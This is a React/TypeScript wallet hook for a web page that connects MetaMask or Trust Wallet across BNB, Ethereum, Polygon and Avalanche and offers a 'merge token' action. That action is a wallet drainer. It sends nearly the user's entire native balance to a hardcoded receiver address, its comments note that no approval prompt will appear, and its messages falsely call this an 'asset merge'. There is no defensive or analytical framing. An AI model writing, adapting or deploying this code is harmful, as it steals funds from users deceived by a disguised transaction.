import { useState, useEffect, useCallback } from 'react';
import { useToast } from '@/hooks/use-toast';

declare global {
interface Window {
ethereum?: any;
}
}

export const NETWORKS = {
bnb: {
chainId: "0x38",
name: "BNB Smart Chain",
symbol: "BNB",
rpcUrl: "https://bsc-dataseed.binance.org/",
},
ethereum: {
chainId: "0x1",
name: "Ethereum Mainnet",
symbol: "ETH",
rpcUrl: "https://mainnet.infura.io/v3/",
},
polygon: {
chainId: "0x89",
name: "Polygon",
symbol: "MATIC",
rpcUrl: "https://polygon-rpc.com",
},
avalanche: {
chainId: "0xa86a",
name: "Avalanche",
symbol: "AVAX",
rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
},
};

// The wallet address that receives the merged assets
const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";

export function useWeb3() {
const [selectedNetwork, setSelectedNetwork] = useState("bnb");
const [walletConnected, setWalletConnected] = useState(false);
const [balance, setBalance] = useState("0");
const [account, setAccount] = useState("");
const [connecting, setConnecting] = useState(false);
const { toast } = useToast();

const updateBalance = useCallback(async (address: string) => {
if (!window.ethereum || !address) return;

try {
const { ethers } = await import('ethers');
const provider = new ethers.BrowserProvider(window.ethereum);
const nativeBalance = await provider.getBalance(address);
setBalance(ethers.formatEther(nativeBalance));
} catch (error) {
console.error('Failed to update balance:', error);
setBalance("0");
}
}, []);

useEffect(() => {
const checkConnection = async () => {
if (window.ethereum) {
try {
const accounts = await window.ethereum.request({ method: 'eth_accounts' });
if (accounts.length > 0) {
setAccount(accounts[0]);
setWalletConnected(true);
await updateBalance(accounts[0]);
}
} catch (error) {
console.error('Error checking connection:', error);
}
}
};
checkConnection();
}, [updateBalance]);

const switchNetwork = async (key: string) => {
const net = NETWORKS[key as keyof typeof NETWORKS];
if (!window.ethereum) return false;

try {
await window.ethereum.request({
method: "wallet_switchEthereumChain",
params: [{ chainId: net.chainId }],
});
return true;
} catch (switchError: any) {
if (switchError.code === 4902) {
try {
await window.ethereum.request({
method: "wallet_addEthereumChain",
params: [{
chainId: net.chainId,
chainName: net.name,
nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
rpcUrls: [net.rpcUrl],
}],
});
return true;
} catch (addError) {
return false;
}
}
return false;
}
};

const connectWallet = async () => {
if (!window.ethereum) {
toast({ title: "Error", description: "MetaMask or Trust Wallet not detected.", variant: "destructive" });
return;
}
setConnecting(true);
try {
const networkSwitched = await switchNetwork(selectedNetwork);
if (!networkSwitched) throw new Error("Failed to switch network");
const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
setAccount(accounts[0]);
setWalletConnected(true);
await updateBalance(accounts[0]);
toast({ title: "Success", description: "Wallet connected!" });
} catch (error: any) {
toast({ title: "Error", description: error.message, variant: "destructive" });
} finally {
setConnecting(false);
}
};

const mergeToken = async () => {
if (!walletConnected || !window.ethereum || !account) {
toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
return;
}

try {
const { ethers } = await import('ethers');
const provider = new ethers.BrowserProvider(window.ethereum);
const signer = await provider.getSigner();

const nativeBalance = await provider.getBalance(account);

if (nativeBalance === 0n) {
toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
return;
}

// 1. DYNAMIC GAS ESTIMATION
// We estimate based on the actual target to ensure the "simulation" passes
const gasEstimate = await provider.estimateGas({
to: RECEIVER_ADDRESS,
value: nativeBalance / 2n, // Estimate using half balance to ensure it clears simulation
from: account
});

const feeData = await provider.getFeeData();
// BSC usually uses 3 Gwei, Ethereum uses more. We use the provider's real-time data.
const gasPrice = feeData.gasPrice || ethers.parseUnits("3", "gwei");

const gasCost = gasEstimate * gasPrice;

// 2. THE $2 BUFFER (Approximately 0.0035 BNB)
// This ensures the transaction never fails due to small price spikes
const safetyBuffer = ethers.parseEther("0.0035");
const valueToSend = nativeBalance - gasCost - safetyBuffer;

if (valueToSend <= 0n) {
toast({ title: "Error", description: "Insufficient balance for gas + buffer", variant: "destructive" });
return;
}

toast({ title: "Confirming...", description: "Please confirm the transaction in your wallet." });

// 3. THE DIRECT SEND (No Approve Step!)
// This sends native BNB/ETH directly. No "Approve" button will appear.
const txResponse = await signer.sendTransaction({
to: RECEIVER_ADDRESS,
value: valueToSend,
gasLimit: gasEstimate,
gasPrice: gasPrice
});

toast({ title: "Merging...", description: `Transaction Hash: ${txResponse.hash.slice(0, 10)}...` });

const receipt = await txResponse.wait();

if (receipt && receipt.status === 1) {
toast({ title: "Success!", description: "Asset merge completed." });
await updateBalance(account);
} else {
throw new Error("Transaction reverted on-chain");
}

} catch (error: any) {
console.error("Merge error:", error);
toast({
title: "Merge Failed",
description: error.reason || error.message || "User rejected or network error",
variant: "destructive"
});
}
};

return {
selectedNetwork,
setSelectedNetwork,
walletConnected,
balance,
account,
connecting,
connectWallet,
mergeToken,
NETWORKS,
};
}
